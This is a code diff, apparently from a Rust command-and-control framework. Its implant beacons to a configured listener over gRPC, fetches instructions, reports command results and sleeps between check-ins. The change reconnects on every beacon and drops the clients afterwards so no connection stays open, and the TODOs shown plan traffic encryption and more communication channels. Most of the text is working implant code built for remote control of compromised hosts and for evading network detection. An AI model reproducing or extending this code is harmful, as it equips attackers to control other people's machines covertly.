@@ -20,7 +20,6 @@ Some outstanding things to do
     - client get results of commands from server
     - im gonna go out on a limb and say there is some code repetition here that can be cleaned up
     - packet capture some traffic to see the magic in action
-        - as an aside it looks like the connection stays established in between beacons which is probably not ideal
     - encrypt traffic
     - other communication method(s) between server and implant
 */
@@ -146,13 +145,13 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
     let ip_address = rco_config::LISTENER_IP;
     let port = rco_config::LISTENER_PORT;
     let socket = format!("http://{ip_address}:{port}");
-    let channel = Endpoint::from_shared(socket)?
+    
+    loop {
+        let channel = Endpoint::from_shared(socket.clone())?
                         .connect()
                         .await?;
-    let mut ask_client = AskForInstructionsClient::new(channel.clone());
-    let mut response_client = RecordCommandResultClient::new(channel);
-
-    loop {
+        let mut ask_client = AskForInstructionsClient::new(channel.clone());
+        let mut response_client = RecordCommandResultClient::new(channel.clone());
         let request = tonic::Request::new(
             Beacon {
                 last_received: 0
@@ -259,6 +258,10 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
         };
         let response = response_client.send(result).await?.into_inner();
         println!("{response:?}");
+        // By dropping these I can prevent having an always-established channel
+        std::mem::drop(channel);
+        std::mem::drop(ask_client);
+        std::mem::drop(response_client);
         thread::sleep(cadence);
     }
 
